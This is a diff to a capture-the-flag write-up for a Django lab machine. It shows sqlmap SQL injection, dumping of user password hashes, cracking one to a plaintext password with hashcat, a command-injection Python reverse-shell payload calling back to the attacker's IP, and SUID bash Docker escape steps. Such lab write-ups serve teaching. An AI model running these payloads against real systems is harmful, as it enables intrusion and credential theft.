@@ -3,7 +3,7 @@
 
 ## Recon
 In the beginning, I used NMAP with the following parameters. I found only ports 22 and 8000 open (it seems to be a Django application running on Linux).
-```
+```bash
 sudo nmap 172.16.11.225 -Pn -sSVC -T5
 
 PORT     STATE SERVICE  VERSION
@@ -15,7 +15,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 ```
 
 I performed fuzzing on the Django application using Feroxbuster and discovered three directories: register, panel, and dashboard.
-```
+```bash
 feroxbuster -u http://172.16.11.225:8000/
 
 found:5       errors:0      
@@ -30,7 +30,9 @@ Upon accessing the page, the most prominent feature is a search field that passe
 ![q parameter image](../images/kof/q_parameter.png)
 
 When testing this endpoint with SQLMap, it was identified that the database uses SQLite and that the parameter is vulnerable to SQL injection (SQLi).
-`python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --risk 3 --level`
+```bash
+python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --risk 3 --level
+```
 
 ![sqlmap 1 image](../images/kof/sqlmap_q1.png)
 ![sqlmap 2 image](../images/kof/sqlmap_q2.png)
@@ -39,7 +41,7 @@ When testing this endpoint with SQLMap, it was identified that the database uses
 We can include the `--dbms` sqlite flag to specify that the database in use is SQLite.
 
 To enumerate the database tables, we use the `--tables` option and execute the following arguments: `--dbms sqlite --threads 10`.
-```
+```bash
 python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --dbms "sqlite" --tables --threads 10
 
 [12 tables]
@@ -60,7 +62,7 @@ python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --dbms "sqlite" --tables --th
 ```
 
 To discover the columns of a table, we use the `-T table_name --columns` option. In our case, we'll retrieve the columns from the `auth_user` table, as we have a `/panel` endpoint where we can attempt to log in.
-```
+```bash
 python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --dbms "sqlite" --threads 10 -T auth_user --columns
 
 Table: auth_user
@@ -83,7 +85,7 @@ Table: auth_user
 ```
 
 From the `auth_user` table, we want to extract the `username`, `password`, `is_staff`, and `is_superuser` columns. Most likely, the user with `is_staff` and `is_superuser` set to true will be the admin.
-```
+```bash
 $ python3 sqlmap.py -u "172.16.11.225:8000/?q=teste" --dbms "sqlite" --threads 10 -T auth_user -C username,password,is_staff,is_superuser --dump
 
 Table: auth_user
@@ -98,7 +100,7 @@ Table: auth_user
 ```
 
 The user "vanessa" is likely the admin. We can use Hashcat to identify the hash type (based on the hash itself, we conclude it’s a PBKDF2-SHA256 from Django). To do this, we extract the hash of the user and save it in a file without an extension, named `hash`. From there, we can attempt to crack the hash using Hashcat with mode `10000` (for PBKDF2-SHA256) and the Rockyou wordlist.
-```
+```bash
 hashcat --identify hash
 
 The following hash-mode match the structure of your input hash:
@@ -107,7 +109,7 @@ The following hash-mode match the structure of your input hash:
 ======+============================================================+======================================
 10000 | Django (PBKDF2-SHA256)                                     | Framework
 ```
-```
+```bash
 hashcat -m 10000 hash /usr/share/seclists/Passwords/rockyou.txt
 
 pbkdf2_sha256$720000$uPmPwj655iBMXMnJkLwRfZ$yqgjRdOIa3GV9uFMTFSR6RLTRfz/PQxQ6u31NkYtYMQ=:princess1
@@ -123,8 +125,8 @@ Since the machine doesn't have internet access, it won't be able to reach any pu
 ![panel image](../images/kof/panel3.png)
 
 What might be happening here is that we are directly passing the IP, and the server is executing some action. We can try to establish a reverse connection to our machine by injecting a ; (since it could be executed in bash) and using Python. Payload:
-```
-;export RHOST="10.0.10.235";export RPORT=1234;python-c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';
+```bash
+;export RHOST="10.0.10.235";export RPORT=1234;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")';
 ```
 ![shell request image](../images/kof/shell_request.png)
 ![shell image](../images/kof/shell.png)
@@ -140,7 +142,7 @@ To upgrade the shell to a full TTY, we can follow these steps:
 At first glance, using `ps aux`, I identified that we are in a Docker environment. I couldn't find the first flag, meaning the first objective is to escalate to root, and the second is to perform a Docker escape.
 
 After running `linpeas` on the server, I found two endpoints to investigate. Upon analyzing this information, we can conclude that `/usr/bin/bash` may be exploitable (it has the SUID bit set).
-```
+```bash
 ══╣ Breakout via mounts
 ╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts
 
@@ -149,7 +151,7 @@ After running `linpeas` on the server, I found two endpoints to investigate. Upo
 ═╣ /proc mounted? ................. Yes
 ```
 
-```
+```bash
 cp /bin/bash /tmp/ #From non priv inside mounted folder
 # You need to copy it from the host as the bash binaries might be diferent in the host and in the container
 chown root:root bash #From container as root inside mounted folder
